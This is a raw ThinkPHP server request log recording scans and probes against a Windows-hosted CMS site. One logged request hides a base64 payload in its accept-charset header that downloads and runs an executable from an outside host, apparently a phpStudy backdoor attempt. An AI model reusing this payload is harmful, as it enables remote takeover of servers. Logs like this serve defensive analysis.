[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000222s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T15:19:11+08:00 ] 116.62.174.255 GET 114.115.146.220/index.php
[è¿è¡Œæ—¶é—´ï¼š0.014204s] [åžåçŽ‡ï¼š70.40req/s] [å†…å­˜æ¶ˆè€—ï¼š473.80kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000702s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000736s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'accept' => '*/*',
  'accept-charset' => 'c3lzdGVtKCdjZXJ0dXRpbC5leGUgLXVybGNhY2hlIC1zcGxpdCAtZiBodHRwOi8vZmsub3BlbnlvdXJhc3MuaWN1L2Rvd25sb2FkLmV4ZSAlU3lzdGVtUm9vdCUvVGVtcC92bG12d2tzbnZyc25pcXI0OC5leGUgJiAlU3lzdGVtUm9vdCUvVGVtcC92bG12d2tzbnZyc25pcXI0OC5leGUnKTtlY2hvIG1kNSgncGhwc3R1ZHknKTs=',
  'accept-encoding' => 'gzip,deflate',
  'accept-language' => 'zh-cn',
  'referer' => 'http://114.115.146.220:80/index.php',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'host' => '114.115.146.220',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000627s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000252s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000208s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T15:30:12+08:00 ] 206.189.37.55 GET /
[è¿è¡Œæ—¶é—´ï¼š0.035562s] [åžåçŽ‡ï¼š28.12req/s] [å†…å­˜æ¶ˆè€—ï¼š471.55kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000094s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001055s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001090s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)',
  'accept' => '*/*',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001488s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000338s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000224s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T15:39:30+08:00 ] 111.119.48.149 GET 114.115.146.220:80/
[è¿è¡Œæ—¶é—´ï¼š0.026289s] [åžåçŽ‡ï¼š38.04req/s] [å†…å­˜æ¶ˆè€—ï¼š472.14kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000060s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001175s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001209s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000919s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000389s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000241s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T16:12:38+08:00 ] 60.191.66.222 GET 114.115.146.220:80/manager/html
[è¿è¡Œæ—¶é—´ï¼š0.018979s] [åžåçŽ‡ï¼š52.69req/s] [å†…å­˜æ¶ˆè€—ï¼š333.27kb] [æ–‡ä»¶åŠ è½½ï¼š117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001030s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001065s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'manager',
    1 => 'html',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => 'text/html, application/xhtml+xml, */*',
  'user-agent' => 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0)',
  'host' => '114.115.146.220:80',
  'authorization' => 'Basic Og==',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000213s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T16:17:24+08:00 ] 83.97.20.49 GET /
[è¿è¡Œæ—¶é—´ï¼š0.024030s] [åžåçŽ‡ï¼š41.61req/s] [å†…å­˜æ¶ˆè€—ï¼š470.84kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001041s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001074s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000858s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000325s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000231s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T16:39:36+08:00 ] 31.192.140.185 GET 114.115.146.220:80/
[è¿è¡Œæ—¶é—´ï¼š0.024008s] [åžåçŽ‡ï¼š41.65req/s] [å†…å­˜æ¶ˆè€—ï¼š472.14kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001040s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001074s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000838s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000335s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000221s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T17:17:12+08:00 ] 190.130.2.230 GET 114.115.146.220:80/
[è¿è¡Œæ—¶é—´ï¼š0.048548s] [åžåçŽ‡ï¼š20.60req/s] [å†…å­˜æ¶ˆè€—ï¼š472.14kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000211s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001639s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001694s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001946s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000697s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000235s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T17:17:12+08:00 ] 190.130.2.230 GET 114.115.146.220:80/
[è¿è¡Œæ—¶é—´ï¼š0.045531s] [åžåçŽ‡ï¼š21.96req/s] [å†…å­˜æ¶ˆè€—ï¼š472.14kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000098s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001748s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001804s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001977s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000707s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000378s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T18:45:30+08:00 ] 80.82.77.33 GET 114.115.146.220/
[è¿è¡Œæ—¶é—´ï¼š0.025541s] [åžåçŽ‡ï¼š39.15req/s] [å†…å­˜æ¶ˆè€—ï¼š472.42kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000072s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001106s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001140s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'host' => '114.115.146.220',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001215s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000327s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000225s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T18:45:31+08:00 ] 80.82.77.33 GET 114.115.146.220/sitemap.xml
[è¿è¡Œæ—¶é—´ï¼š0.010594s] [åžåçŽ‡ï¼š94.39req/s] [å†…å­˜æ¶ˆè€—ï¼š332.46kb] [æ–‡ä»¶åŠ è½½ï¼š117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000055s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000695s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000728s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'sitemap.xml',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'accept-encoding' => 'identity',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000211s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T18:45:32+08:00 ] 80.82.77.33 GET 114.115.146.220/.well-known/security.txt
[è¿è¡Œæ—¶é—´ï¼š0.010839s] [åžåçŽ‡ï¼š92.26req/s] [å†…å­˜æ¶ˆè€—ï¼š332.57kb] [æ–‡ä»¶åŠ è½½ï¼š117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000068s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000945s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000978s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '.well-known',
    1 => 'security.txt',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'accept-encoding' => 'identity',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000214s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T18:45:32+08:00 ] 80.82.77.33 GET 114.115.146.220/favicon.ico
[è¿è¡Œæ—¶é—´ï¼š0.010397s] [åžåçŽ‡ï¼š96.18req/s] [å†…å­˜æ¶ˆè€—ï¼š333.02kb] [æ–‡ä»¶åŠ è½½ï¼š117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000056s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.000702s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000735s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'favicon.ico',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'connection' => 'keep-alive',
  'accept-encoding' => 'gzip, deflate',
  'accept' => '*/*',
  'user-agent' => 'python-requests/2.13.0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000216s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T19:00:12+08:00 ] 185.234.217.182 GET 114.115.146.220:80/
[è¿è¡Œæ—¶é—´ï¼š0.025269s] [åžåçŽ‡ï¼š39.57req/s] [å†…å­˜æ¶ˆè€—ï¼š472.33kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001057s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001091s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000863s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000382s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000227s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T19:17:25+08:00 ] 80.82.70.187 GET www.baidu.comhttp://www.baidu.com/cache/global/img/gs.gif
[è¿è¡Œæ—¶é—´ï¼š0.019057s] [åžåçŽ‡ï¼š52.47req/s] [å†…å­˜æ¶ˆè€—ï¼š332.79kb] [æ–‡ä»¶åŠ è½½ï¼š117]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000060s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001037s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001071s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'cache',
    1 => 'global',
    2 => 'img',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.baidu.com',
  'user-agent' => 'Mozilla',
  'if-modified-since' => 'Thu, 19 Apr 2012 09:51:20 GMT',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000214s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T19:34:43+08:00 ] 157.119.227.110 GET 114.115.146.220:80/
[è¿è¡Œæ—¶é—´ï¼š0.024388s] [åžåçŽ‡ï¼š41.00req/s] [å†…å­˜æ¶ˆè€—ï¼š472.14kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000057s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001143s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001201s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000865s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000328s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000230s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T19:45:33+08:00 ] 159.203.201.126 GET 114.115.146.220/
[è¿è¡Œæ—¶é—´ï¼š0.023789s] [åžåçŽ‡ï¼š42.04req/s] [å†…å­˜æ¶ˆè€—ï¼š471.96kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001029s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001063s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000839s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000327s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000219s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T19:54:42+08:00 ] 191.97.41.166 GET 114.115.146.220:80/
[è¿è¡Œæ—¶é—´ï¼š0.027938s] [åžåçŽ‡ï¼š35.79req/s] [å†…å­˜æ¶ˆè€—ï¼š472.14kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000060s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001016s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001049s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '114.115.146.220:80',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'content-length' => '0',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000849s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000333s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
  0 => 'user',
  1 => 'site',
  2 => 'config',
) ]
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @response_send [ RunTime:0.000219s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-12-01T19:57:26+08:00 ] 5.189.134.236 GET /
[è¿è¡Œæ—¶é—´ï¼š0.024216s] [åžåçŽ‡ï¼š41.30req/s] [å†…å­˜æ¶ˆè€—ï¼š471.55kb] [æ–‡ä»¶åŠ è½½ï¼š129]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000058s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\cms\Cms @app_init [ RunTime:0.001038s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001072s ]
[ info ] [ LANG ] C:\www\thinkphp\lang\zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)',
  'accept' => '*/*',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LANG ] C:\www\public/../application/index\lang\zh-cn.php
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000856s ]
[ info ] [ BEHAVIOR ] Run \addons\nkeditor\Nkeditor @config_init [ RunTime:0.000328s ]
[ info ] [ LANG ] C:\www\public/../application/index/lang/zh-cn/index.php
[ info ] [ RUN ] app\index\controller\Index->index[ C:\www\application\index\controller\Index.php ]
[ info ] [ VIEW ] C:\www\public/../application/index\view\index\index.html [ array (
